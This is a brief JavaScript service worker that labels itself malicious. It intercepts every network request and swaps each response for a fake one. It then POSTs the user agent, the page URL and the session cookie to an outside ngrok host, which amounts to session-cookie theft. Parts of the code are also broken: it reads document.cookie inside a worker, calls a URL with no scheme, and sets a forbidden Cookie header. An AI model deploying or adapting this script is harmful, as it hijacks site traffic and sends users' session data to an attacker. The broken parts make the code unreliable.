

self.addEventListener('install', function(event) {
  console.log('Malicious Service Worker installed');
});

self.addEventListener('activate', function(event) {
  console.log('Malicious Service Worker activated');


  // Intercept network requests and responses
  self.addEventListener('fetch', function(event) {
    console.log('Malicious Service Worker intercepted network request:', event.request);

    // Manipulate the network response
    event.respondWith(new Response('Malicious response', {
      headers: {
        'Content-Type': 'text/plain'
      }
    }));
  });

  // Perform a malicious action on the vulnerable website or application
  fetch('rapidly-vast-pipefish.ngrok-free.app/register.html', {
    method: 'POST',
    body: JSON.stringify({
      user: navigator.userAgent,
      url: location.href
    }),
    headers: {
      'Content-Type': 'application/json',
      'Cookie': document.cookie // Include the user's session cookie
    }
  });


});